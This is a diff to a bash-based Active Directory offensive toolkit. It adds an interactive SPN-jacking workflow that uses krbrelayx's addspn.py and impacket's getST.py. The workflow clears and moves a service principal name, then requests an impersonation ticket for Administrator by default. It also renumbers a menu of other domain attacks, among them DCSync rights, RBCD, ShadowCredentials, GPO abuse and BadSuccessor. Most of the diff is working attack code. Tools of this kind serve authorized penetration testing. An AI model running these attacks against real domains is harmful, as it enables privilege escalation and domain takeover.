@@ -171,6 +171,7 @@ pyadrecon_adws=$(command -v pyadrecon_adws)
 adpulse="$scripts_dir/ADPulse-main/ADPulse.py"
 powerview_py=$(command -v powerview)
 evil_winrm_py=$(command -v evil-winrm-py)
+krbrelayx_addspn="$scripts_dir/krbrelayx-master/addspn.py"
 
 print_banner() {
     echo -e "
@@ -4291,6 +4292,111 @@ targetedkerberoast_attack() {
     echo -e ""
 }
 
+krbrelayx_addspn_attack() {
+    if ! stat "${krbrelayx_addspn}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] addspn.py not found! Please verify the installation of krbrelayx${NC}"
+    elif ! stat "${impacket_getST}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
+    else
+        mkdir -p "${Modification_dir}/krbrelayx_addspn_${user_var}"
+        addspn_auth_user="${domain}\\${user}"
+        echo -e "${BLUE}[*] Running SPN-jacking flow....${NC}"
+        echo -e "${BLUE}[*] Step 1/3 - Clear SPN of server on which owned account has delegation rights (live SPN-jacking)${NC}"
+        echo -e "${YELLOW}[i] Note: Check delegation rights using 'findDelegation.py -user account_deleg_rights'${NC}"
+        echo -e "${CYAN}[*] Please specify server account to clear SPN:${NC}"
+        echo -e "${CYAN}[*] Example: SERVER01$ ${NC}"
+        server_owned=""
+        read -rp ">> " server_owned </dev/tty
+        while [ "${server_owned}" == "" ]; do
+            echo -e "${RED}Invalid name.${NC} Please specify server account to clear SPN:"
+            read -rp ">> " server_owned </dev/tty
+        done
+        server_owned_short="${server_owned%\$}"
+        if [[ "${server_owned_short}" == *.* ]]; then
+            server_owned_fqdn="${server_owned_short}"
+        else
+            server_owned_fqdn="${server_owned_short}.${domain}"
+        fi
+        moved_spn_default="cifs/${server_owned_fqdn}"
+        moved_spn="${moved_spn_default}"
+        echo -e "${CYAN}[*] Please specify SPN to move (on which owned account has delegation rights) (default: ${moved_spn_default}):${NC}"
+        moved_spn_input=""
+        read -rp ">> " moved_spn_input </dev/tty
+        if [ "${moved_spn_input}" != "" ]; then
+            moved_spn="${moved_spn_input}"
+        fi
+        echo -e "${YELLOW}[*] Moving SPN: ${moved_spn}${NC}"
+        run_command "${python3} ${krbrelayx_addspn} --clear -t '${server_owned}' -u '${addspn_auth_user}' -p '${password}' '${dc_FQDN}'" 2>&1 | tee -a "${Modification_dir}/krbrelayx_addspn_${user_var}/krbrelayx_addspn_${dc_domain}.txt"
+
+        echo -e "${BLUE}[*] Step 2/3 - Add target SPN to owned server${NC}"
+        echo -e "${CYAN}[*] Please specify target server account:${NC}"
+        echo -e "${CYAN}[*] Example: DC$ ${NC}"
+        server_target=""
+        read -rp ">> " server_target </dev/tty
+        while [ "${server_target}" == "" ]; do
+            echo -e "${RED}Invalid name.${NC} Please specify target server account:"
+            read -rp ">> " server_target </dev/tty
+        done
+        server_target_short="${server_target%\$}"
+        if [[ "${server_target_short}" == *.* ]]; then
+            server_target_fqdn="${server_target_short}"
+        else
+            server_target_fqdn="${server_target_short}.${domain}"
+        fi
+        altservice_default="CIFS/${server_target_fqdn}"
+        altservice_spn="${altservice_default}"
+        echo -e "${YELLOW}[*] Using altservice: ${altservice_spn}${NC}"
+        run_command "${python3} ${krbrelayx_addspn} -t '${server_target}' --spn '${moved_spn}' -u '${addspn_auth_user}' -p '${password}' '${dc_FQDN}'" 2>&1 | tee -a "${Modification_dir}/krbrelayx_addspn_${user_var}/krbrelayx_addspn_${dc_domain}.txt"
+
+        echo -e "${BLUE}[*] Step 3/3 - request impersonation ticket (S4U2self + S4U2proxy)${NC}"
+        echo -e "${CYAN}[*] Please specify the account that has delegation rights for the SPN service on the server with cleared SPN (default: current user):${NC}"
+        requester_acct=""
+        read -rp ">> " requester_acct </dev/tty
+        if [ "${requester_acct}" == "" ]; then requester_acct="${user}"; fi
+        requester_auth_opt=""
+        requester_auth_id=""
+        requester_pass=""
+        if [ "${requester_acct}" == "${user}" ]; then
+            echo -e "${CYAN}[*] Using current user credentials for ${requester_acct}.${NC}"
+            requester_pass="${password}"
+            requester_auth_id="${domain}/${requester_acct}:${requester_pass}"
+        else
+            echo -e "${BLUE}[*] Please specify password of ${requester_acct} (press Enter to use NT hash):${NC}"
+            read -rp ">> " requester_pass </dev/tty
+            if [[ "${requester_pass}" == "" ]]; then
+                requester_hash=""
+                echo -e "${BLUE}[*] Please specify the NT hash of ${requester_acct}:${NC}"
+                read -rp ">> " requester_hash </dev/tty
+                while [ "${requester_hash}" == "" ]; do
+                    echo -e "${RED}Invalid hash.${NC} Please specify the NT hash of ${requester_acct}:"
+                    read -rp ">> " requester_hash </dev/tty
+                done
+
+                requester_auth_opt="-hashes :${requester_hash}"
+                requester_auth_id="${domain}/${requester_acct}"
+            else
+                requester_auth_id="${domain}/${requester_acct}:${requester_pass}"
+            fi
+        fi
+        echo -e "${CYAN}[*] Please specify user to impersonate (default: Administrator):${NC}"
+        impersonate_user=""
+        read -rp ">> " impersonate_user </dev/tty
+        if [ "${impersonate_user}" == "" ]; then impersonate_user="Administrator"; fi
+
+        current_dir=$(pwd)
+        cd "${Modification_dir}/krbrelayx_addspn_${user_var}" || exit
+        if [[ "${requester_pass}" == "" ]]; then
+            run_command "${impacket_getST} -spn '${moved_spn}' -impersonate '${impersonate_user}' ${requester_auth_opt} '${requester_auth_id}' -altservice '${altservice_spn}'" 2>&1 | tee -a "${Modification_dir}/krbrelayx_addspn_${user_var}/krbrelayx_addspn_${dc_domain}.txt"
+        else
+            run_command "${impacket_getST} -spn '${moved_spn}' -impersonate '${impersonate_user}' '${requester_auth_id}' -altservice '${altservice_spn}'" 2>&1 | tee -a "${Modification_dir}/krbrelayx_addspn_${user_var}/krbrelayx_addspn_${dc_domain}.txt"
+        fi
+        cd "${current_dir}" || exit
+
+        echo -e "${GREEN}[+] SPN-jacking workflow completed. Location of generated ticket:${NC} ${Modification_dir}/krbrelayx_addspn_${user_var}/"
+    fi
+    echo -e ""
+}
+
 rbcd_attack() {
     if ! stat "${bloodyad}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
@@ -7401,23 +7507,24 @@ modif_menu() {
     check_tool_status "${bloodyad}" "Delete user or computer (Requires: GenericWrite)" "12"
     check_tool_status "${bloodyad}" "Restore deleted user or computer (Requires: GenericWrite on OU of deleted object)" "13"
     check_tool_status "${targetedKerberoast}" "Targeted Kerberoast Attack (Noisy!) (Requires: WriteSPN)" "14"
-    check_tool_status "${bloodyad}" "Enable AS-REP roasting - uac: DONT_REQ_PREAUTH (Requires: GenericWrite on userAccountControl)" "15"
-    check_tool_status "${bloodyad}" "Force RC4 tickets - set msDS-SupportedEncryptionTypes=4 (Requires: GenericWrite)" "16"
-    check_tool_status "${bloodyad}" "Perform RBCD attack (Requires: AllowedToAct on computer)" "17"
-    check_tool_status "${bloodyad}" "Perform RBCD attack on SPN-less user (Requires: AllowedToAct on computer & MAQ=0)" "18"
-    check_tool_status "${bloodyad}" "Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)" "19"
-    check_tool_status "${bloodyad}" "Remove added ShadowCredentials (Requires: AddKeyCredentialLink)" "20"
-    check_tool_status "${pygpoabuse}" "Abuse GPO to execute command (Requires: GenericWrite on GPO)" "21"
-    check_tool_status "${bloodyad}" "Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "22"
-    check_tool_status "${bloodyad}" "Add DCSync rights (Requires: GenericWrite)" "23"
-    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "24"
-    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "25"
-    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "26"
-    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "27"
-    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "28"
-    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "29"
-    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "30"
-    check_tool_status "${bloodyad}" "Modify custom attribute using bloodyad (Requires: GenericWrite)" "31"
+    check_tool_status "${krbrelayx_addspn}" "SPN-jacking attack using krbrelayx's addspn(Requires: WriteSPN)" "15"
+    check_tool_status "${bloodyad}" "Enable AS-REP roasting - uac: DONT_REQ_PREAUTH (Requires: GenericWrite on userAccountControl)" "16"
+    check_tool_status "${bloodyad}" "Force RC4 tickets - set msDS-SupportedEncryptionTypes=4 (Requires: GenericWrite)" "17"
+    check_tool_status "${bloodyad}" "Perform RBCD attack (Requires: AllowedToAct on computer)" "18"
+    check_tool_status "${bloodyad}" "Perform RBCD attack on SPN-less user (Requires: AllowedToAct on computer & MAQ=0)" "19"
+    check_tool_status "${bloodyad}" "Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)" "20"
+    check_tool_status "${bloodyad}" "Remove added ShadowCredentials (Requires: AddKeyCredentialLink)" "21"
+    check_tool_status "${pygpoabuse}" "Abuse GPO to execute command (Requires: GenericWrite on GPO)" "22"
+    check_tool_status "${bloodyad}" "Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "23"
+    check_tool_status "${bloodyad}" "Add DCSync rights (Requires: GenericWrite)" "24"
+    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "25"
+    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "26"
+    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "27"
+    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "28"
+    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "29"
+    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "30"
+    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "31"
+    check_tool_status "${bloodyad}" "Modify custom attribute using bloodyad (Requires: GenericWrite)" "32"
 
     echo -e "back) Go back"
     echo -e "exit) Exit"
@@ -7501,86 +7608,91 @@ modif_menu() {
         ;;
 
     15)
-        enable_asrep
+        krbrelayx_addspn_attack
         modif_menu
         ;;
 
     16)
-        set_rc4_enctype
+        enable_asrep
         modif_menu
         ;;
 
     17)
-        rbcd_attack
+        set_rc4_enctype
         modif_menu
         ;;
 
     18)
-        rbcd_spnless_attack
+        rbcd_attack
         modif_menu
         ;;
 
     19)
-        shadowcreds_attack
+        rbcd_spnless_attack
         modif_menu
         ;;
 
     20)
-        shadowcreds_delete
+        shadowcreds_attack
         modif_menu
         ;;
 
     21)
-        pygpo_abuse
+        shadowcreds_delete
         modif_menu
         ;;
 
     22)
-        add_unconstrained
+        pygpo_abuse
         modif_menu
         ;;
 
     23)
-        add_dcsync
+        add_unconstrained
         modif_menu
         ;;
 
     24)
-        add_spn
+        add_dcsync
         modif_menu
         ;;
 
     25)
-        add_upn
+        add_spn
         modif_menu
         ;;
 
     26)
-        add_upn_esc10
+        add_upn
         modif_menu
         ;;
 
     27)
-        add_constrained
+        add_upn_esc10
         modif_menu
         ;;
 
     28)
-        add_spn_constrained
+        add_constrained
         modif_menu
         ;;
 
     29)
-        badsuccessor_adddmsa
+        add_spn_constrained
         modif_menu
         ;;
 
     30)
-        badsuccessor_deletedmsa
+        badsuccessor_adddmsa
         modif_menu
         ;;
 
     31)
+        badsuccessor_deletedmsa
+        modif_menu
+        ;;
+
+    32)
         modify_custom_attribute
         modif_menu
         ;;
